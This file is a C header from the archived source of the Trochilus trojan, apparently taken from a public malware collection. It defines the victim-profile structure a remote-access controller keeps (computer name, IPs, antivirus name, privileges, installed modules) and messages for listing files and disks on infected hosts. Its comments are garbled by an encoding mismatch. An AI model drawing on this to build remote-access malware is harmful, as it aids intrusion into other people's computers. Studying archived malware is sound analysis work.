/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include "env/EnvData.h"
#include "ModuleMessage.h"
//�ͻ��˻�����Ϣ
#define MAX_LOCALIP_COUNT 5
#define MAX_MODNAMES 1024
#define MAX_ITEM 255
typedef struct  
{
	WCHAR			clientid[60];	//�ͻ���id
	ULONG			connectIP;	//����IP
	WCHAR			computerName[MAX_COMPUTERNAME_LENGTH + 1];	//�������
	WIN_VER_DETAIL	windowsVersion;	//����ϵͳ
	BOOL			bX64;	//�Ƿ�x64ƽ̨
	SYSTEMTIME		installTime;	//�ͻ��˰�װʱ��
	WCHAR			avname[MAX_PATH];	//ɱ������
	ULONG			localIPList[MAX_LOCALIP_COUNT];	//����IP�б�
	USHORT			localIPCount;	//����IP�б�����
	WCHAR			groups[MAX_ITEM]; //������
	WCHAR			priv[MAX_ITEM]; //Ȩ��
	WCHAR			proto[MAX_ITEM]; //Э��
	WCHAR			vercode[MAX_ITEM];//����ϵͳ�汾��
	WCHAR			lang[MAX_ITEM];//����
	int				cpunum;
	int				cpufrep;
	int				memsize;
	WCHAR			mods[MAX_MODNAMES];	//�Ѱ�װģ��
} CLIENT_INFO;
enum {
	WM_ADD_CLIENT = WM_USER + 1001,
	WM_DEL_CLIENT,
	WM_LISTFILES,	//MFileInfoList* / NULL
	WM_LISTDISKS,	//MDiskInfoList* / NULL
	WM_TRANSFER_FINISH
};

typedef enum
{
	MODULESTATUS_UNINSTALLED = 0,
	MODULESTATUS_INSTALLING,
	MODULESTATUS_INSTALLED,
} MODULE_INST_STATUS;

typedef void (CALLBACK *FnNotifyProc)(UINT nMsg, LPVOID lpContext, LPVOID lpParameter);
typedef void (CALLBACK *FnModuleNotifyProc)(LPCTSTR clientid,UINT nMsg, LPVOID lpContext, LPVOID lpParameter);
